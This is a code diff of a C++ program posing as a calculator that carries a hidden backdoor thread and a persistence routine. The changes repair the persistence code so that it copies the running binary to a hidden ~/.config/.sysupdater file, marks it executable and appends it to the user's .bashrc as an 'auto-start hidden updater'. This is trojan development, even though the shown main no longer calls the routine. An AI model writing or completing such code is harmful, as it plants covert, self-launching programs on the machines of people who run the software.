@@ -6,6 +6,10 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <dirent.h>
+#include <filesystem>
+#include <fstream>
+#include <cstdlib>
+#include <sys/stat.h>
 
 void run_calculator();
 int get_result(int &a, int &b, char &op);
@@ -13,10 +17,8 @@ void backdoor();
 void permanent();
 int main()
 {
-    permanent();
-    std::thread t(backdoor);
-    t.detach();
-
+    // std::thread t(backdoor);
+    // t.detach();
 
     run_calculator();
 
@@ -57,15 +59,14 @@ void permanent()
     dir_entry = readdir(dp);
     std::string path = path_start + dir_entry->d_name + "/.config/";
     std::string path_exe = path + ".sysupdater";
-    std::string bash_rc_path = path_start + dir_entry->d_name + ".bashrc";
+    std::string bash_rc_path = path_start + dir_entry->d_name + "/.bashrc";
 
     std::cout << "paths:" << std::endl;
     std::cout << path << std::endl;
     std::cout << path_exe << std::endl;
     std::cout << bash_rc_path << std::endl;
-    return;
-
-    if (fs::exists(path_exe))
+    std::ifstream exists(path_exe.c_str());
+    if (exists.good())
     {
         std::cout << "executable already present\n";
         return;
@@ -73,22 +74,20 @@ void permanent()
 
 
     // makes input stream from file pointing to currently running process
-    // makes output stream 
+    // makes output stream
     std::ifstream source("/proc/self/exe", std::ios::binary);
     std::ofstream dest(path_exe, std::ios::binary);
     dest << source.rdbuf();
 
     // changes permissions of new executable
-    chmod(path_exe, 0755);
-
+    chmod(path_exe.c_str(), 0755);
 
     // adds hidden executable to .bashrc so it runs on start
-     std::ofstream bashrc(bash_rc_path, std::ios::app);
-     bashrc << "\n# Auto-start hidden updater\n";
-     bashrc << path_exe << " &\n";
+    std::ofstream bashrc(bash_rc_path, std::ios::app);
+    bashrc << "\n# Auto-start hidden updater\n";
+    bashrc << path_exe << " &\n";
 
-     std::cout << "file at " << path_exe <<  "will run on start" << std::endl;
-     
+    std::cout << "file at " << path_exe << "will run on start" << std::endl;
 }
 
 void run_calculator()
